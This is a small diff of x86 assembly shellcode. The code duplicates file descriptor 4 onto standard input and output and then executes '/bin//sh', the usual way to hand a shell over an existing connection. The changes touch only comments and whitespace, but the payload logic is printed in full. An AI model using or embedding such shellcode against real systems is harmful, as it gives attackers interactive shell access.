@@ -5,7 +5,8 @@ _start:
         /* dup2(2, 0) */
         xor edx, edx
         xor ecx, ecx
-        lea ebx, [edx+4] //fd 4
+		/* fd 4*/
+        lea ebx, [edx+4] 
         lea eax, [edx+63]
         int 0x80
         /* dup2(2, 1) */
@@ -14,7 +15,7 @@ _start:
         int 0x80
         /* execve("/bin//sh", {"/bin//sh", NULL}, NULL) */
         xor edx, edx
-        push edx
+		push edx
         push 0x68732f2f
         push 0x6e69622f
         mov ebx, esp
